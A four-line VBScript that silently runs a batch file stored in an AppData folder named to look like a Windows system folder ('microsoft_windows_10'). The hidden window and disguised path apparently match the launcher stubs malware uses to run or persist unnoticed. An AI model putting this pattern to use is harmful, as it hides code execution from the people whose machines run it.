Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "%appdata%/microsoft_windows_10/run.bat", 0
Set WShell = Nothing